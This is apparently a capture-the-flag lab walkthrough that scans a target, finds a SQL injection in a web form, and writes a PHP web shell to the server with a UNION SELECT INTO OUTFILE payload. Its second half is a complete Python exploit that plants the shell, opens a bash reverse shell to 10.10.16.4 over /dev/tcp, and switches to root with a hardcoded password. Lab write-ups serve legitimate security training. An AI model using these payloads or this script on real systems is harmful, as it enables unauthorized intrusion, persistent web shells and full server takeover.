```bash
nmap -p22,80,8080 -sCV -n -Pn -vvv --min-rate 5000 -oN ./scans/targeted
```

![[Pasted image 20250416220621.png]]
Our first interest is the [[port 80]], we can find something there.
at the web we found this form:
![[Pasted image 20250416222102.png]]
using [[Burpsuite]] we can intercept the request of that and try with [[SQL Injection]]

so, we try send a SQL query injection to test
![[Pasted image 20250416222918.png]]
and this is the response:
![[Pasted image 20250416223125.png]]
so we have a via with SQL Injection.

then we have a way to write a [[reverse shell]] in [[PHP]] using [[SQL]] with the next input:

```mysql
UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/html/test.php"-- -
```

and we have [[Remote Code Execution (RCE)]]
![[Pasted image 20250416230326.png]]

we can automate all the process with the next exploit:
```python
#!/usr/bin/python3

import signal
import requests
import sys
import threading
import time
from pwn import listen


def handler(sig, frame):
    print("\n\n[!] Exiting\n")
    sys.exit(1)


signal.signal(signal.SIGINT, handler)

if len(sys.argv) != 3:
    log.failure("Usage: %s <ip-address> filename" % sys.argv[0])
    sys.exit(1)

lport = 9001
ip_address = sys.argv[1]
filename = sys.argv[2]
main_url = "http://%s/" % ip_address


def create_file():
    data_post = {
        "username": "canary",
        "country": """Brazil' UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/html/%s"-- -"""
        % filename,
    }

    r = requests.post(main_url, data=data_post)


def get_access():
    data_post = {"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.16.4/%s 0>&1'" % lport}

    r = requests.post(main_url + "%s" % filename, data=data_post)


if __name__ == "__main__":
    create_file()
    try:
        threading.Thread(target=get_access, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    cmd = "su root"
    shell.sendline(cmd.encode())

    time.sleep(2)
    password = "uhc-9qual-global-pw"
    shell.sendline(password.encode())

    shell.interactive()
```
